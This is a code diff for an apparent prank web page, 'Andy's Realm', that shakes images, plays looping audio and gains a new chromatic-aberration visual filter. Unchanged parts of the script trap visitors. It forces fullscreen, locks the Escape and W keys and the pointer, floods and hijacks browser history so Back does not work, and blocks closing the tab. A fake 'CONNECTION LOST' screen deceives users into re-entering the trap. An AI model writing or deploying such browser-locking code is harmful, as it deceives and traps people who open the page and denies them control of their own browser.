@@ -6,26 +6,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Andy's Realm</title>
     <style>
-        /* The body stays still; the shaker-box inside it moves */
         body, html { 
-            margin: 0; 
-            padding: 0; 
-            width: 100%; 
-            height: 100%; 
-            overflow: hidden; 
-            background-color: black;
+            margin: 0; padding: 0; width: 100%; height: 100%; 
+            overflow: hidden; background-color: black;
         }
 
         #shaker-box {
-            width: 100vw;
-            height: 100vh;
+            width: 100vw; height: 100vh;
             background-image: url('andyvid.gif'), url('andyside.jpg'), url('andyside.jpg');
             background-position: center center, left center, right center;
             background-repeat: no-repeat, repeat-y, repeat-y;
             background-size: contain, auto 100%, auto 100%;
             position: relative;
-            /* Smooths the vibration so it doesn't look like a lag glitch */
             transition: transform 0.02s linear;
+            /* Apply the SVG filter here */
+            filter: url(#chromatic-aberration);
         }
 
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@@ -54,23 +49,32 @@
 </head>
 <body>
 
-    <!-- Everything inside here will shake together -->
+    <!-- SVG Filter for Chromatic Aberration -->
+    <svg style="position: absolute; width: 0; height: 0;">
+      <filter id="chromatic-aberration">
+        <feColorMatrix type="matrix" 
+          values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="red"/>
+        <feColorMatrix type="matrix" 
+          values="0 0 0 0 0  0 1 0 0 0  0 0 0 0 0  0 0 0 1 0" result="green"/>
+        <feColorMatrix type="matrix" 
+          values="0 0 0 0 0  0 0 0 0 0  0 0 1 0 0  0 0 0 1 0" result="blue"/>
+        <feOffset id="red-offset" in="red" dx="2" dy="0" result="red-offset"/>
+        <feOffset id="blue-offset" in="blue" dx="-2" dy="0" result="blue-offset"/>
+        <feBlend in="red-offset" in2="green" mode="screen" result="temp"/>
+        <feBlend in="temp" in2="blue-offset" mode="screen"/>
+      </filter>
+    </svg>
+
     <div id="shaker-box">
         <img src="andyspin.jpg" class="andy-1">
         <img src="andyspin2.jpg" class="andy-2">
         <img src="andyspin3.jpg" class="andy-3">
-        <div class="andy-circle-container">
-            <img src="andyspin4.jpg" class="andy-4">
-        </div>
+        <div class="andy-circle-container"><img src="andyspin4.jpg" class="andy-4"></div>
     </div>
 
-    <div id="conf">
-        <input type="button" value="click for mythical andy" onclick="start()">
-    </div>
-    
+    <div id="conf"><input type="button" value="click for mythical andy" onclick="start()"></div>
     <div id="fullscreen-trap" onclick="forceFullscreen()">
-        <h1>CONNECTION LOST</h1>
-        <p>CLICK TO RE-ENTER THE REALM</p>
+        <h1>CONNECTION LOST</h1><p>CLICK TO RE-ENTER THE REALM</p>
     </div>
     
     <audio id="jump" loop><source src="mingleboosted.mp3"></audio>
@@ -78,14 +82,20 @@
     <script>
         const trap = document.getElementById('fullscreen-trap');
         const shaker = document.getElementById('shaker-box');
+        const redOffset = document.getElementById('red-offset');
+        const blueOffset = document.getElementById('blue-offset');
 
         function startShaking() {
             setInterval(() => {
-                const intensity = 20; // Increased for a whole-screen effect
+                const intensity = 25;
                 const x = (Math.random() - 0.5) * intensity;
                 const y = (Math.random() - 0.5) * intensity;
-                // Applying the transform to the CONTAINER
                 shaker.style.transform = `translate(${x}px, ${y}px)`;
+
+                // Randomize color split intensity for aberration
+                const split = Math.random() * 8;
+                redOffset.setAttribute('dx', split);
+                blueOffset.setAttribute('dx', -split);
             }, 40); 
         }
 
@@ -93,9 +103,7 @@
             const elem = document.documentElement;
             try {
                 if (elem.requestFullscreen) await elem.requestFullscreen();
-                if (navigator.keyboard && navigator.keyboard.lock) {
-                    await navigator.keyboard.lock(["Escape", "KeyW"]);
-                }
+                if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "KeyW"]);
                 if (elem.requestPointerLock) elem.requestPointerLock();
                 trap.style.display = 'none';
             } catch (err) {}
@@ -110,16 +118,10 @@
             document.querySelector('#jump').play();
             forceFullscreen();
             startShaking();
-
-            // History & Exit Traps
             window.history.pushState(null, null, window.location.href);
             window.onpopstate = () => { window.history.go(1); };
             window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
-
-            setInterval(() => {
-                window.history.pushState(null, "", window.location.href);
-            }, 100);
-
+            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);
             document.addEventListener('visibilitychange', () => {
                 document.title = document.hidden ? "COME BACK TO ANDY" : "Andy's Realm";
             });
